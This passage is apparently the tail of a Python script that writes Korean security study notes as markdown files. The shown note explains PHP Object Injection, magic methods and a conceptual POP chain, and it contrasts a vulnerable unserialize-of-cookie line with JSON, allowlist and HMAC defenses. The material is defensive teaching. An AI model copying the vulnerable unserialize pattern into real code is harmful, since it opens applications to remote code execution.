│  → $this->file 경로 삭제 또는 읽기 실행                       │
└──────────────────────────────────────────────────────────────┘
```

WordPress 플러그인에서 자주 발견되는 이유는 쿠키나 POST 파라미터에 직렬화 데이터를 저장하고 `unserialize()`로 처리하는 패턴이 관행적으로 사용됐기 때문이다.

📢 **섹션 요약 비유**: PHP Object Injection은 마법 인형(직렬화 객체)을 조작해서, 인형이 깨어날 때(역직렬화) 조작된 행동을 하도록 만드는 공격이다.

---

## Ⅱ. 아키텍처 및 핵심 원리

### PHP 매직 메서드와 악용 시나리오

| 매직 메서드 | 트리거 시점 | 악용 시나리오 |
|:---|:---|:---|
| __wakeup() | 역직렬화 직후 | 데이터베이스 연결, 파일 열기 |
| __destruct() | 객체 소멸 시 | 파일 삭제, 명령 실행 |
| __toString() | 문자열 변환 시 | SQL 인젝션, 파일 읽기 |
| __call() | 미정의 메서드 호출 | 임의 메서드 디스패치 |
| __get() | 미정의 속성 접근 | 파일 시스템 접근 |

```text
┌──────────────────────────────────────────────────────────────┐
│              POP Chain (Property-Oriented Programming)       │
├──────────────────────────────────────────────────────────────┤
│  Entry: ClassA::__destruct()                                 │
│      │ $this->obj->method()                                  │
│      ▼                                                       │
│  ClassB::__call('method', args)                              │
│      │ $this->callback($args)                                │
│      ▼                                                       │
│  ClassC::__invoke()                                          │
│      │ eval($this->code)  ← 코드 실행!                        │
│      ▼                                                       │
│  또는 ClassD::__toString()                                   │
│      │ $this->db->query($this->sql)  ← SQL 인젝션!           │
└──────────────────────────────────────────────────────────────┘
```

📢 **섹션 요약 비유**: POP 체인은 인형이 깨어나면 친구 인형을 건드리고, 그 인형이 다른 인형을 건드려 마지막 인형이 창문을 깨는(코드 실행) 도미노다.

---

## Ⅲ. 비교 및 연결

| 항목 | PHP Object Injection | Java Deserialization | Python pickle |
|:---|:---|:---|:---|
| 역직렬화 함수 | unserialize() | readObject() | loads() |
| 매직 메서드 | __wakeup, __destruct | readObject | __reduce__ |
| 공격 복잡도 | 중간 (POP Chain) | 높음 (가젯 체인) | 낮음 (직접 실행) |
| 방어 난이도 | 중간 | 높음 | 낮음 (사용 금지) |

PHP 7.0+에서 `unserialize($data, ['allowed_classes' => false])` 옵션으로 모든 클래스 역직렬화를 차단하거나, 특정 클래스만 허용하는 화이트리스트를 적용할 수 있다.

📢 **섹션 요약 비유**: PHP, Java, Python 역직렬화 취약점은 같은 건물의 다른 입구를 통한 침입과 같다. 입구마다 경비원(방어)이 필요하다.

---

## Ⅳ. 실무 적용 및 기술사 판단

**취약 코드 탐지 및 방어**:

취약한 코드:
```php
$data = unserialize($_COOKIE['user_data']);
```

안전한 코드:
```php
// 옵션 1: JSON으로 대체
$data = json_decode($_COOKIE['user_data'], true);

// 옵션 2: 클래스 화이트리스트 (PHP 7+)
$data = unserialize($input, ['allowed_classes' => ['SafeClass']]);

// 옵션 3: HMAC 서명 검증 후 역직렬화
$expected_hmac = hash_hmac('sha256', $serialized, SECRET_KEY);
if (!hash_equals($expected_hmac, $_COOKIE['hmac'])) {
    die('Invalid signature');
}
$data = unserialize($serialized);
```

**자동화 탐지**: phpggc 도구로 PHP 가젯 체인 페이로드 생성 및 테스트 (승인된 범위에서)

📢 **섹션 요약 비유**: PHP 방어 코드는 마법 인형을 받을 때 "우리 공장(화이트리스트)에서 만든 인형만 받고, 서명(HMAC)이 있는 인형만 개봉"하는 규칙을 만드는 것이다.

---

## Ⅴ. 기대효과 및 결론

PHP Object Injection 방어를 통해 RCE, 파일 시스템 접근, SQL 인젝션 체인 등 연쇄적 공격을 차단할 수 있다. 특히 WordPress·Drupal·Joomla 기반 사이트에서 플러그인의 unserialize 사용을 정기적으로 감사하는 것이 중요하다.

📢 **섹션 요약 비유**: PHP Object Injection 완전 방어는 마법 인형 제도를 완전 폐지하고, 인형 대신 그냥 메모지(JSON)를 쓰는 것이다 — 메모지는 읽기만 하고 저절로 움직이지 않는다.

---

### 📌 관련 개념 맵
| 개념 | 관계 | 설명 |
|:---|:---|:---|
| POP Chain | 공격 구조 | PHP 가젯 체인 |
| phpggc | 공격/테스트 도구 | PHP 가젯 생성기 |
| allowed_classes | 방어 옵션 | unserialize 화이트리스트 |
| __destruct | 공격 진입점 | 가장 많이 악용되는 매직 메서드 |
| HMAC | 무결성 보장 | 직렬화 데이터 서명 |

### 👶 어린이를 위한 3줄 비유 설명
- PHP Object Injection은 마법 인형(직렬화 객체)에 나쁜 주문을 심어서, 인형이 깨어날 때(역직렬화) 집에 불을 지르게 하는 공격이에요.
- 인형이 깨어나면 자동으로 주문이 실행되니까 나쁜 주문이 있으면 위험해요.
- 직접 만든 인형(JSON)만 쓰거나, 허락된 인형만 받으면(화이트리스트) 안전해요!
"""),
}

for filename, (weight, title, content) in files.items():
    filepath = os.path.join(BASE, filename)
    if os.path.exists(filepath):
        print(f"SKIP (exists): {filename}")
        continue
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(f'+++\nweight = {weight}\ntitle = "{title}"\ndate = "2026-04-21"\n[extra]\ncategories = "studynote-security"\n+++\n')
        f.write(content)
    print(f"CREATED: {filename}")

print("Done with batch 459-463")
